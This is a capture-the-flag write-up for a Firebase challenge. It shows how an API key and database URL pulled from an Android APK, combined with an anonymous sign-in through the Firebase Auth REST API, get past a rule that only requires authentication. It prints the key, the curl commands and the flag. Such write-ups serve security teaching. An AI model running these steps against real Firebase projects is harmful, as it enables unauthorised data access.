# [02] The Database — Writeup

**Points:** 200
**Category:** Firebase
**Flag:** `FAM{4n0n_4uth_1s_n0t_s3cur3_en0ugh}`

## Challenge

> The door is open to anyone. You don't need a name to enter, but the room still has a lock.
>
> hint: identity is optional here

Same APK as challenge 01: `fam-ctf.apk`

## Thought process

The category label was **Firebase**, and the flavor text reads like a riddle about Firebase Auth + Firebase Realtime Database security rules:

- *"The door is open to anyone"* + *"identity is optional"* — this is describing **anonymous authentication**. Firebase lets you sign in without a username/password/email and still get a valid identity token.
- *"You don't need a name to enter, but the room still has a lock"* — so being anonymous is enough to get *in the door*, but there's still a **database security rule** gating the actual data. The likely rule is something like `".read": "auth != null"` — it doesn't check *who* you are, just *that* you're authenticated at all. Anonymous auth satisfies that.

So the plan was:
1. Reuse the Firebase project info already recovered in challenge 01 (API key, Realtime Database URL).
2. Confirm the database is indeed locked for unauthenticated requests.
3. Sign in anonymously via the Firebase Auth REST API to get an ID token.
4. Re-read the database with that token attached and see if the lock opens.

No new tools were needed — everything after the initial APK teardown is just HTTP calls, so `curl` was sufficient.

## Recon carried over from challenge 01

While solving "The Library," static analysis of `classes3.dex` had already surfaced:

- **Firebase Web API key** (hardcoded, meant for `google-services.json` but still sensitive when combined with open rules):
  ```
  AIzaSyAes0IV3Hq3pN0oYmZJ1kfKl9vcvQEF2ww
  ```
- **Realtime Database URL**:
  ```
  https://fam-ctf-default-rtdb.asia-southeast1.firebasedatabase.app
  ```
- Method names in `MainActivity` hinting at the flow: `signInAnonymously`, `signInAnonymouslyAndVerifyFlag2`, `verifyFlag2`.
- String constants for database node names: `flag`, `flag3`, `users`, `username` — telling me the flag for this stage most likely lives at the `/flag` node (matching the `verifyFlag2` / `signInAnonymouslyAndVerifyFlag2` naming, i.e., "flag #2" in the app's own numbering, stored simply as `/flag`).

## Steps

### 1. Confirm the database is locked

```bash
curl -s "https://fam-ctf-default-rtdb.asia-southeast1.firebasedatabase.app/flag.json"
```

Response:
```json
{
  "error" : "Permission denied"
}
```

Same result on the root path (`/.json`). This confirms a security rule is blocking unauthenticated reads — the "lock" the hint mentioned.

### 2. Sign in anonymously

Firebase Auth's REST endpoint `accounts:signUp` (used by the SDK under the hood for `signInAnonymously()`) issues a new anonymous identity when called with just `returnSecureToken`:

```bash
curl -s -X POST \
  "https://identitytoolkit.googleapis.com/v1/accounts:signUp?key=AIzaSyAes0IV3Hq3pN0oYmZJ1kfKl9vcvQEF2ww" \
  -H "Content-Type: application/json" \
  -d '{"returnSecureToken":true}'
```

This returned a JSON response containing an `idToken` (a signed JWT) and a fresh anonymous `localId` — no credentials were required, matching "identity is optional."

### 3. Read the database again, this time authenticated

Firebase's REST API accepts the ID token as an `auth` query parameter on database reads:

```bash
curl -s "https://fam-ctf-default-rtdb.asia-southeast1.firebasedatabase.app/flag.json?auth=<idToken>"
```

Response:
```json
"FAM{4n0n_4uth_1s_n0t_s3cur3_en0ugh}"
```

The lock only required *being* authenticated, not *who* was authenticating — exactly what the hints described.

### 4. Sanity-check the other nodes

For completeness, I also tried the `flag3` node and database root with the same anonymous token:

```bash
curl -s "https://fam-ctf-default-rtdb.asia-southeast1.firebasedatabase.app/flag3.json?auth=<idToken>"
curl -s "https://fam-ctf-default-rtdb.asia-southeast1.firebasedatabase.app/.json?auth=<idToken>"
```

Both still returned `Permission denied` — so `flag3` (and the rest of the tree) has stricter rules than anonymous auth satisfies, meaning a later challenge will require a real/privileged identity rather than just "any authenticated user."

## Tools used

- `curl` — issue the Firebase Auth REST call and the Realtime Database REST reads
- (Recon carried over from challenge 01: `unzip` + `strings` on the APK to recover the API key, database URL, and node names — no new extraction was needed for this stage)

## Key takeaway

An open Firebase Realtime Database rule like `auth != null` is **not** real access control if the project also allows anonymous sign-in — anyone can mint a free, valid identity via the public Auth REST API and satisfy the rule. Security rules need to check *identity/claims*, not just *presence* of authentication, or combine anonymous auth with tighter, per-resource rules.
